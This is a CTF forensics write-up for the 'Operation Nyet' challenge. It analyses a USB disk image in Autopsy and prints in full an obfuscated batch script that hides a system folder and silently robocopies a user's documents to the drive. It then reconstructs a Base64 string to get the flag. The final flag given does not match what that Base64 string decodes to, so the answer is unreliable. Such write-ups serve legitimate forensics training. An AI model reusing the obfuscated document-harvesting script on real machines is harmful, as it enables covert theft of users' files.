---
slug: "local-ctf/bahtera-3108-2025/operation-nyet"
event: "bahtera-3108-2025"
title: "Operation Nyet"
summary: "Analyze an E01 USB image, deobfuscate a batch file, reconstruct its Base64 payload, and recover the Operation Nyet flag."
date: 2025-08-30
tags:
  - ctf
  - bahtera-3108
  - forensics
  - disk-forensics
  - base64
category: "local-ctf"
difficulty: "medium"
platform: "ctf"
draft: false
---

# Operation Nyet

## Challenge Overview

- **Event:** Bahtera 3108 2025
- **Category:** Forensics
- **Points:** 100
- **Provided material:** An `.E01` forensic image

> Pada suatu hari, ketika Khairul Aming meninggalkan laptopnya tanpa pengawasan, seorang staf menyambungkan USB miliknya ke laptop tersebut dan melakukan sesuatu.
>
> Beberapa saat kemudian, dia mencabut USB itu dan beredar. Tindakannya tidak disedari Khairul Aming, namun sempat diperhatikan oleh seorang rakan sekerja yang berasa curiga.
>
> Beberapa jam kemudian, USB tersebut secara cuai ditinggalkan di atas mejanya. Rakan sekerja itu mengambil USB tersebut kerana ingin mengetahui rahsia di dalamnya.
>
> Kini, tugas anda adalah untuk menyiasat isi kandungan USB tersebut melalui fail imej forensik yang diberikan (`.E01`).

## Examining the USB Image

I loaded the E01 image into Autopsy as a data source.

![USB E01 image loaded as an Autopsy data source](/images/writeups/local-ctf/bahtera-3108-2025/operation-nyet/autopsy-case-data-source.png)

The volume contained an `OperationNyet` directory and an obfuscated batch file named `USBBackup___.bat`.

![USB file listing in Autopsy](/images/writeups/local-ctf/bahtera-3108-2025/operation-nyet/autopsy-usb-file-listing.png)

Opening the batch file in Autopsy exposed its full text.

![Obfuscated batch file extracted in Autopsy](/images/writeups/local-ctf/bahtera-3108-2025/operation-nyet/autopsy-obfuscated-batch-file.png)

## Deobfuscating the Batch File

The recovered script was:

```bat
&cls
@echo off
setlocal EnableDelayedExpansion
set wjdk=set
%wjdk% "userProfile=C:\Users\Aming"
%wjdk% "Loc=%~d0\OperationNyet"
%wjdk% gwdoy=
%wjdk% "a4=o"
%wjdk% "x1=r"
%wjdk% "b1=3"
%wjdk% "a1=r"
%wjdk% "x2=o"
%wjdk% "x3=b"
%wjdk% "b2=f"
%wjdk% "x4=o"
%wjdk% "a8=y"
%wjdk% "x5=c"
%wjdk% "x6=o"
%wjdk% "a2=o"
%wjdk% "b3=1"
%wjdk% "a5=c"
%wjdk% "x7=p"
%wjdk% "x8=y"
%wjdk% "a6=o"
%wjdk% "a3=b"
%wjdk% "a7=p"
%wjdk% "p1=%a1%%a2%"
%wjdk% "p2=%a3%%a4%"
%wjdk% "p3=%a5%%a6%"
%wjdk% "p4=%a7%%a8%"
%wjdk% "rcmd=%p1%%p2%%p3%%p4%"
%wjdk% "vZ=55ZX"
%wjdk% "X4=WV0"
%wjdk% "q7=wOH"
%wjdk% "kQ=X25"
%wjdk% "uT=0="
%wjdk% "jK=tue"
%wjdk% "Y9=5ZX"
%wjdk% "zn=Rfcm"
%wjdk% "d3=lldH"
%wjdk% "LM=lhX2"
%wjdk% "xA=MzE"
%wjdk% "aX=Rfbn"
%wjdk% "P2=Foc2"
%wjdk% "tmp1=!xA!!q7!"
%wjdk% "tmp2=!jK!!X4!"
%wjdk% "tmp3=!kQ!!Y9!"
%wjdk% "tmp4=!zn!!P2!"
%wjdk% "tmp5=!LM!!vZ!"
%wjdk% "tmp6=!aX!!d3!!uT!"
%wjdk% "NYET=!tmp1!!tmp2!!tmp3!!tmp4!!tmp5!!tmp6!"
mkdir "%Loc%" >nul 2>&1
attrib +h +s "%Loc%" >nul 2>&1
call %rcmd% "%userProfile%" "%Loc%" *.txt *.pdf *.docx *.xlsx *.xls /s /njh /njs /ndl /np /r:0 /w:0 >nul
echo Operation Nyet !NYET! completed.
timeout /t 1 >nul
exit
```

The `wjdk` variable expands to `set`. The script also assembles `rcmd` from four fragments:

```text
p1 = ro
p2 = bo
p3 = co
p4 = py
rcmd = robocopy
```

It creates a hidden system directory named `OperationNyet` on the USB drive and uses `robocopy` to collect `.txt`, `.pdf`, `.docx`, `.xlsx`, and `.xls` files from `C:\Users\Aming`.

The flag material is built separately from the short variables:

```bat
%wjdk% "vZ=55ZX"
%wjdk% "X4=WV0"
%wjdk% "q7=wOH"
%wjdk% "kQ=X25"
%wjdk% "uT=0="
%wjdk% "jK=tue"
%wjdk% "Y9=5ZX"
%wjdk% "zn=Rfcm"
%wjdk% "d3=lldH"
%wjdk% "LM=lhX2"
%wjdk% "xA=MzE"
%wjdk% "aX=Rfbn"
%wjdk% "P2=Foc2"
```

Substituting each value gives:

```text
tmp1 = MzE + wOH
tmp2 = tue + WV0
tmp3 = X25 + 5ZX
tmp4 = Rfcm + Foc2
tmp5 = lhX2 + 55ZX
tmp6 = Rfbn + lldH + 0=
```

Concatenating the six fragments produces:

```text
MzEwOHtueWV0X255ZXRfcmFoc2lhX255ZXRfbnlldH0=
```

This string is Base64. Decoding it reveals the flag.

![Base64 payload decoded to the Operation Nyet flag](/images/writeups/local-ctf/bahtera-3108-2025/operation-nyet/base64-decoded-flag.png)

## Flag

```text
3108{nyet_nyet_rahsia_nyet_nyet_bnyet}
```
